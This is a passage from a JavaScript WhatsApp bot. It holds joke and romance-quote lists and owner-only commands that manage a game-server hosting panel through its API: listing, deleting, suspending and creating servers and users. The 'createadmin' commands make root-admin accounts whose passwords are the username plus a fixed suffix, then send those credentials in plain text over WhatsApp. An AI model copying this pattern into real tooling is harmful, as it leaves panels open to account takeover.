'Google is great, right? But unfortunately, no matter how great Google is, it cant find our soul mate.',
'Too often holding an eyebrow pencil can make your eyes blind, if you poke it into your eyes.',
'I work hard because I realize that money doesnt have legs to find its way into my pocket.',
'If you are unable to convince and amaze people with your intelligence, confuse them with your stupidity.',
'When youre tired from working, youre even more tired when youre unemployed.',
'We live in a time when you are angry when you are wrong, but when you are right you are called wrong.',
'No boyfriends shoulder? Dont worry, theres still a shoulder to lean on.',
'Loving yourself is natural, what is not natural is loving your father.',
'He said he couldnt lie. Yes, only the eyes can see.',
'Honey in your right hand, poison in your left hand, your soul mate remains in Gods hands.',
'Cheating doesnt happen because there is intention, cheating happens because your girlfriend is still selling.',
'Netizens who do thumb exercises on their cell phones dont use cooling, no wonder their comments keep getting hot.',
'Your soul mate doesnt go anywhere, but your rivals are everywhere.',
'I always feel wrong in your eyes. If thats the case, tomorrow Ill move it to your nose.',
'Theres no need to be ashamed of being single, being single doesnt mean youre not selling, but that no one wants to.',
'If your prayer has not been answered then be patient, remember that it is not just you who is praying!',
'Still hoping and continuing to hope that over time I will become the champion of hope.',
'Humans can plan, but in the end balance is what determines',
'His status is spiritual, his behavior is spiritual.',
'Failure is not success',
'I was going to eat meatballs, but it was really hot, it looked like the meatballs were having a fever.',
'I was once rich too, when I got paid.',
'I was dumped by my girlfriend because we had different beliefs. Im sure that Im handsome, but hes not.',
'Your future depends on your dreams, so sleep more.',
'No matter how heavy your work is, it will be lighter if you dont carry it.',
'Do not expect too much! Ill get sick later!',
'Remember! Youre single',
'I dont know what to type',
]
    let bacotan = pickRandom(bacot)
  reply(bacotan)
}} 
break
//=========================================\\======
case 'lol': {if (prefix === '.') {
const bucin = [
    "I chose to be alone, not because I was waiting for the perfect one, but because I needed someone who never gave up.",
    "A single person is created with a partner he has not yet found.",
    "Single. Maybe that's God's way of saying 'Take a break from wrong love'.",
    "Singles are young people who prioritize their personal development for a more classy love in the future.",
    "I'm not looking for someone who is perfect, but I'm looking for someone who is perfect thanks to my strengths.",
    "People's boyfriends are our pending soul mates.",
   "Singleness will pass. Everything comes to a time, when all solitude becomes togetherness with a halal lover. Be patient.",
    "Romeo was willing to die for Juliet, Jack died to save Rose. The point is, if you still want to live, be single.",
    "I look for people not for their strengths, but I look for people for their sincerity.",
    "A soul mate is not flip-flops, which are often confused. So keep on fighting properly.",
    "If you are a guitar string, I don't want to be the guitarist. Because I don't want to break up with you.",
    "If loving you is an illusion, then let me imagine forever.",
    "Honey... My job is only to love you, not fight fate.",
    "When I'm with you it feels like 1 hour is only 1 second, but if I'm far from you it feels like 1 day becomes 1 year.",
    "Sumedang tofu banana compote, even though the distance stretches, my love will never disappear.",
    "I want to be the only one, not one of them.",
    "I can't promise to be good. But I promise to always be by your side.",
    "If I become a representative of the people I will definitely fail, how can I think about the people if the only thing on my mind is you?",
    "Look at my garden, full of flowers. Look at your eyes, my heart is full of flowers.",
    "Promise to stay with me now, tomorrow and forever.",
    "Longing does not only arise because of distance apart. But also because of desires that do not come true.",
    "You will never be far from me, wherever I go you are always there, because you are always in my heart, what is far is only our bodies, not our hearts.",
    "I know that in every glance I make, we are hindered by distance and time. But I am sure that in the future we will definitely be able to be together.",
    "Missing you without ever meeting you is like writing a song that has never been sung.",
    "There are times when distance is always a barrier between me and you, but still in my heart we are always close.",
    "If this heart can't contain all the longing, there's nothing I can do except pray for you.",
    "Maybe at this moment I can only hold back this longing. Until the time comes when I can meet and release this longing with you.",
    "Through the longing that surges in my heart, sometimes I really need your loving embrace.",
    "In the cold night, I can no longer remember; How often I think about you and miss you.",
    "Missing you is like rain that comes suddenly and lasts a long time. And even after the rain stops, I still miss you.",
    "Since I got to know you, I want to keep learning, learning to be the best for you.",
    "Do you know the difference between a pencil and your face? With a pencil the writing can be erased, but with your face nothing can be erased from my mind.",
    "It's not the National Exam tomorrow that I have to worry about, but the life exam that I went through after you left me.",
    "One thing that makes me happy at school is being able to see your smile every day.",
    "Do you know the difference between going to school and going to your house? If you go to school, you will definitely bring books and pens, but if you go to your house, I just bring my heart and love.",
    "I'm not sad if tomorrow is Monday, I'll be sad if I don't see you.",
    "The moment of my love is perpendicular to the moment of your love. Making our love a perfect equilibrium point.",
    "I'm willing to take part in a race around the world, as long as you are the finish line.",
    "My homework is to miss you. Stronger than Mathematics, broader than Physics, stronger than Biology.",
    "My love for you is like metabolism, which will not stop until death.",
    "If you're as tall as you, come and pick me up, I'll take you home.",
    "Eat whatever I like as long as it's with you, including eating liver.",
    "Love is like a death sentence. If you don't shoot, you'll hang.",
    "Loving you is like a drug: once you try it, it becomes addictive, don't try it, it makes you curious, you leave it and it makes you addicted.",
    "I like snacking the most because snacking is delicious. Moreover, I have you completely...",
    "This world only belongs to the two of us. The others are just renting.",
    "For me, all days are Tuesdays. Tuesdays in Heaven if you are close...",
    "What if we both become a gang of criminals? I steal your heart and you steal mine.",
    "You are like the coffee I sipped this morning. Bitter, but addictive.",
    "I'm often jealous of your lipstick. He can kiss you every day, from morning to night.",
    "Just hearing your name can make me smile like a fool.",
    "I know you don't have just one female friend, and I don't only like you.",
    "Since I stopped hoping for you, I haven't been enthusiastic about anything...",
    "With you, falling in love is the most deliberate heartbreak.",
    "It's very difficult to feel the happiness of life without your presence by my side.",
    "Through the longing that surges in my heart, sometimes I really need your loving embrace.",
    "If only you knew, until now I still love you.",
    "Sometimes I'm jealous of kites... the string breaks and I'm still being chased and I'm not willing to be snatched by someone else...",
    "I didn't know what love was, until I finally met you. But, right then, I knew what it felt like to have a broken heart.",
    "Chasing is tiring, but waiting is even more tiring\nWaiting for you to realize where I am...",
    "Don't stop loving just because you have been hurt. Because there is no rainbow without rain, there is no true love without crying.",
    "I have a million reasons to forget you, but nothing can force me to stop loving you.",
    "Sometimes a person feels so stupid just to love someone.",
    "You are the best heartbreaker that I will never regret.",
    "It's not that it's not worth waiting for, it just often gives false hope.",
    "Part of me feels sick, remembering him who was so close, but untouchable.",
    "The best thing in loving someone is to secretly love them.",
    "I wish I could get rid of this feeling as quickly as I lost you.",
    "For the sake of love we deceive ourselves. Trying to be strong actually falls dishonorably.",
    "Consider me your home, if you leave you understand where you are going home. Stay if you want and leave if you are bored...",
    "I'm confused, should I be disappointed or not? If I'm disappointed, who am I to him?\n\nIf I'm not disappointed, I'm waiting for what he says.",
    "My longing is like a branch that remains standing. Even though there are no more leaves to accompany it, until finally it dries up, breaks and dies.",
    "I guess we are now just two strangers who have the same memories.",
    "Make me able to hate you even if only for a few minutes, so that it won't be too hard to forget you.",
    "I love you with all my heart, but you end up sharing your feelings with other people.",
    "Loving you might break me, but somehow leaving you doesn't fix me.",
    "You are the main and first in my life. But, I am second to you.",
    "If we could only meet in dreams, I want to sleep forever.",
    "Seeing you happy is my happiness, even if you are happy without being with me.",
    "I sometimes envy an object. It doesn't have taste but is always needed. It's different from me who has taste, but is abandoned and ignored...",
    "How can I move if only you have my heart stopped?",
    "Memories of you are like home to me. So every time my mind wanders, it will always come back to you.",
    "Why is tissue useful? Because love never runs dry. - Sujiwo Tejo",
    "If loving you is a mistake, that's fine, let me just keep making mistakes.",
    "Since I met you, I want to keep learning. Learning to be the best for you.",
    "Someone acts stupid just to see you smile. And he feels happy about that.",
    "I'm not a good person, but I will learn to be the best for you.",
    "We don't die, but the wound makes us unable to walk like before.",
    "Your existence is like a cup of coffee that I need every morning, which can encourage me to stay enthusiastic about going through the day.",
    "I really want to give you the world. But because that's not possible, I will give you the most important thing in my life, namely my world.",
    "It's better to be humorous but sweet, rather than pretending to be romantic but ending tragically.",
    "Ben, don't be disappointed, you have to understand when to hope and when to stop.",
    "I don't understand the meaning of 'I Love U'. But I understand the meaning of 'I love you'.",
    "I don't need your beauty and grace, I just want to be loyal to you, I'm so happy.",
    "My love for you is following the camera, your focus is still blurry.",
    "Every day Dino keeps dreaming but can't do it.",
    "Don't meet you 30 dino rasane koyo a month.",
    "I'm like a lost cat without you. Lost.",
    "I want to, I'm playing around all the time. Supoyo I'm playing around with you. Ben Lewih dowo my time is hanging out with your slira.",
    "I never understood what Kui Tresno, Kajaba sak bare met karo sliramu.",
    "Love aa ka neng moal leungit-leungit sanajan aa geus marry deui.",
    "Your patience is limited, but your love is epna.",
    "I'm afraid you'll lose your snacks using Bayclean.",
    "Memories endah keur babareng with jeung anjeun ek tuluy remembered nepi ka poho.",
    "I'm dying and I'm going to have to live alone, I need help from my family for a while.",
    "Nyaahna aa ka neg tea if the banker is going to collect debts (hayoh mumuntil)",
    "Your patience is limited, but your love is very meaningful.",
    "I feel like I'm composing words about my love for you in my world, then I'm not going to get together, so that I'm really feeling a lot of love for you.",
    "Calm down, Neng, Ari Akang's love is Sapertos Krispatih song; It's timeless.",
    "Abdi sanes jalmi nu is perfect pikeun anjeun, sareng sanes oge nu is the best kanggo anjeun. But nu for sure, servant jalmi hiji-hijina nu continues to emut ka anjeun.",
    "Just lose the network, don't do it.",
    "I often eat my heart out. But realizing you're still here makes me happy again.",
    "My enemies are those who want to have you too.",
    "There are always many, but if you are the only one I want, what?",
    "My sleep hours have been ruined by longing.",
    "It's enough that China is far away, don't love us.",
    "What's important is your happiness, mine isn't important...",
    "My only wish is to be loved by you...",
    "Me without you is like an ambulance without wiuw wiuw wiuw.",
    "It's enough that Antarctica is far away. Don't take us between us."
]
const Nanotruth = bucin[Math.floor(Math.random() * bucin.length)]
	reply(`${Nanotruth}`)
}} 
break

//==================================================================
case 'viral':{if (prefix === '.') {
  if (!DanzTheCreator) return reply(mess.only.owner)
  reply(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./database/anuu.json'))
var hasil = pickRandom(asupan)
LordVoltage.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
}}
break
//==================================================================
//==================================================================
case 'listusr': {if (prefix === '.') {
  if (!DanzTheCreator) return reply(mess.only.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Here is the list of users:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await LordVoltage.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Use commands ${prefix}listusr ${res.meta.pagination.current_page + 1} to see the next page.`);
  }
}}
break;
        case 'delsrv': {if (prefix === '.') {
      if (!DanzTheCreator) return reply(`Special ${global.botname} Aja`)

let srv = args[0]
if (!srv) return reply('Where Is his ID?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}}
        break
        case 'delusr': {if (prefix === '.') {
  if (!DanzTheCreator) return reply(`Special ${global.botname} Aja`)
let usr = args[0]
if (!usr) return reply('Where Is his ID?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}}
        break
                
case 'listsrv': {if (prefix === '.') {
  if (!DanzTheCreator) return reply(`Sorry, you can't see the server list.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Here is a list of servers:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await LordVoltage.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Use commands ${prefix}listsrv ${res.meta.pagination.current_page + 1} to see the next page.`);
  }
}}
break;

case 'tutorial': {if (prefix === '.') {
const owned = `2348126003566@s.whatsapp.net`
const text12 = nanoliatwaktu + ` *@${sender.split("@")[0]}*
╭ *★ 📄 ᴛᴜᴛᴏʀɪᴀʟ 📄 ★*
┃ _[https://youtube.me
┃ *please subscribe*
╰★
> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧`
LordVoltage.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: fkontak })
}}
break

case 'ramlist': { if (prefix === '.') {
const owned = `2348126003566@s.whatsapp.net`
const text12 = nanoliatwaktu + ` *@${sender.split("@")[0]}*

╭★💫𝗦𝗘𝗥𝗩𝗘𝗥 𝗩𝟭💫★
┃🪀 𝟭𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃🪀 𝟮𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃🪀 𝟯𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃🪀 𝟰𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃🪀 𝟱𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃🪀 𝟲𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃🪀 𝟳𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃🪀 𝟴𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃🪀 𝗨𝗡𝗟𝗜 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃
╰★

---

╭ ★ 📌 𝗘𝗫𝗔𝗠𝗣𝗟𝗘: 📌 ★
┃
┃🪀 𝗥𝗔𝗠 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥
┃🪀 𝟭𝗚𝗕 𝗡𝗨𝗠𝗕𝗘𝗥, 𝟮𝟯𝟰𝘅𝘅𝘅
┃
╰★

---

╭ ★ 📌 𝗦𝗘𝗥𝗩𝗘𝗥 𝗩𝟮 📌 ★
┃
┃📌 𝗦𝗥𝗩𝟮𝟭𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃📌 𝗦𝗥𝗩𝟮𝟮𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃📌 𝗦𝗥𝗩𝟮𝟯𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃📌 𝗦𝗥𝗩𝟮𝟰𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃📌 𝗦𝗥𝗩𝟮𝟱𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃📌 𝗦𝗥𝗩𝟮𝟲𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃📌 𝗦𝗥𝗩𝟮𝟳𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃📌 𝗦𝗥𝗩𝟮𝟴𝗚𝗕 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃📌 𝗦𝗥𝗩𝟮𝗨𝗡𝗟𝗜 [𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥]
┃
╰★

---

╭ ★ 📌 𝗘𝗫𝗔𝗠𝗣𝗟𝗘: 📌 ★
┃
┃📌 𝗦𝗥𝗩𝟮𝗥𝗔𝗠 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘,𝗡𝗨𝗠𝗕𝗘𝗥
┃📌 𝗦𝗥𝗩𝟮𝟭𝗚𝗕 𝗡𝗨𝗠𝗕𝗘𝗥, 𝟮𝟯𝟰𝘅𝘅𝘅
╰★

> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧`
LordVoltage.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: fkontak })
}}
break
case 'premlist':{if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.owner)
let listprem =`*LIST SELLER ${global.botname}*\n\nTotal Seller : ${owner.length}\n`
var no = 1
for (let x of owner) {
listprem +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listprem +=`To Remove Premium Access Type ${prefix}delprem 234xxx/@tag`
LordVoltage.sendMessage(m.chat, {text: listprem },{quoted: LordVoltage.chat})
}}
break
case 'addsrv': {if (prefix === '.') {
if (!DanzTheCreator) return reply(`What are you doing ? This Feature is Special for My Master😜`)
let s = text.split(',');
if (s.length < 7) return reply(`*Incorrect format!*

Use:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
// = data.attributes.pStartup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "Certified user by Famous Dev👌",
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start",
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
CPU: ${server.limits.cpu}%`)
}}
        break
case 'suspend': {if (prefix === '.') {
            if (!DanzTheCreator) return reply(`Special ${global.botname} Ajah`)
            let srv = args[0]
            if (!srv) return reply('Where Is his ID?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
            reply('*SUCCEED SUSPEND..*')
        }}
            break
            case 'unsuspend': {if (prefix === '.') {
            if (!DanzTheCreator) return reply(`Special ${global.botname} Ajah`)
            let srv = args[0]
            if (!srv) return reply('Where Is his ID?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*SUCCESSFULLY UNSUSPENDED..*')
        }}
            break
case 'createadmin': {if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/number\n\nExample :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/number\n\nExample :\n${prefix+command} example,@user`)
let password = username + "46093"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "shafow",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
╭(SUCCESSFUL) 
┃★ ᴛʏᴘᴇ: ᴜsᴇʀ
╰𓊈★ ᴀᴅᴍɪɴ: ${user.root_admin}
> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧`
    const listMessage = {

        text: tks,

    }

	

    await LordVoltage.sendMessage(m.chat, listMessage)

   const imagePath = './data/image/thumb.jpg'; 
   const caption = `
╭ *𝐂𝐎𝐍𝐆𝐑𝐀𝐓𝐒 𝐘𝐎𝐔 𝐇𝐀𝐕𝐄 𝐄𝐀𝐑𝐍𝐄𝐃 𝐀𝐃𝐌𝐈𝐍𝐒𝐇𝐈𝐏*
┃🪀𝐈𝐃: ${user.id}
 l
┃🪀𝐄𝐌𝐀𝐈𝐋: ${user.email}
 l
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : ${username}
 l
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
 l
╰🪀𝐋𝐎𝐆𝐈𝐍:

${domain}

╭ *𝐍𝐎𝐓𝐄 :*
> 𝐃𝐎 𝐍𝐎𝐓 𝐂𝐑𝐄𝐀𝐓𝐄 𝐀𝐍𝐎𝐓𝐇𝐄𝐑 𝐀𝐃𝐌𝐈𝐍
> 𝐃𝐎 𝐍𝐎𝐓 𝐂𝐑𝐄𝐀𝐓𝐄 𝐔𝐍𝐍𝐄𝐂𝐄𝐒𝐒𝐀𝐑𝐘 𝐏𝐀𝐍𝐄𝐋
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
> 𝐃𝐎 𝐍𝐎𝐓 𝐃𝐃𝐎𝐒
> 𝐃𝐎 𝐍𝐎𝐓 𝐏𝐄𝐄𝐊 𝐎𝐑 𝐒𝐓𝐄𝐀𝐋 𝐒𝐄𝐑𝐕𝐄𝐑𝐒
> 𝐃𝐎𝐍𝐓 𝐀𝐁𝐈𝐃𝐄 𝐀𝐍𝐃 𝐆??𝐓 𝐊𝐈𝐂𝐊𝐄𝐃
╰*𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐕𝐎𝐋𝐓𝐀𝐆𝐄 𝐋𝐎𝐑𝐃 𝐃𝐄𝐕*
`
await LordVoltage.sendImage(nomornya, imagePath, caption);
}}
break
                case 'createadmin2': {if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.owner)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/number\n\nExample :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/number\n\nExample :\n${prefix+command} example,@user`)
let password = username + "46093"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "shadow",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
╭(SUCCESSFUL) 
┃★ ᴛʏᴘᴇ: ᴜsᴇʀ
╰ ★ᴀᴅᴍɪɴ: ${user.root_admin}
> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧`
    const listMessage = {

        text: tks,

    }

	

    await LordVoltage.sendMessage(m.chat, listMessage)

   const imagePath = './data/image/thumb.jpg'; 
   const caption = `
╭ *𝐂𝐎𝐍𝐆𝐑𝐀𝐓𝐒 𝐘𝐎𝐔 𝐇𝐀𝐕𝐄 𝐄𝐀𝐑𝐍𝐄𝐃 𝐀𝐃𝐌𝐈𝐍𝐒𝐇𝐈𝐏*
┃🪀𝐈𝐃: ${user.id}
 l
┃🪀𝐄𝐌𝐀𝐈𝐋: ${user.email}
 l
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : ${username}
 l
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
 l
╰🪀𝐋𝐎𝐆𝐈𝐍:

${domain}

╭ *𝐍𝐎𝐓𝐄 :*
> 𝐃𝐎 𝐍𝐎𝐓 𝐂𝐑𝐄𝐀𝐓𝐄 𝐀𝐍𝐎𝐓𝐇𝐄𝐑 𝐀𝐃𝐌𝐈𝐍
> 𝐃𝐎 𝐍𝐎𝐓 𝐂𝐑𝐄𝐀𝐓𝐄 𝐔𝐍𝐍𝐄𝐂𝐄𝐒𝐒𝐀𝐑𝐘 𝐏𝐀𝐍𝐄𝐋
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
> 𝐃𝐎 𝐍𝐎𝐓 𝐃𝐃𝐎𝐒
> 𝐃𝐎 𝐍𝐎𝐓 𝐏𝐄𝐄𝐊 𝐎𝐑 𝐒𝐓𝐄𝐀𝐋 𝐒𝐄𝐑𝐕𝐄𝐑𝐒
> 𝐃𝐎𝐍𝐓 𝐀𝐁𝐈𝐃𝐄 𝐀𝐍𝐃 𝐆𝐄𝐓 𝐊𝐈𝐂𝐊𝐄𝐃
╰*POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧*
`
await LordVoltage.sendImage(nomornya, imagePath, caption);
}}
        break
        case 'listadmin': {if (prefix === '.') {
  if (!DanzTheCreator) return reply(`Sorry, you can't see the user list.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "The following is a list of admins:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await LordVoltage.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
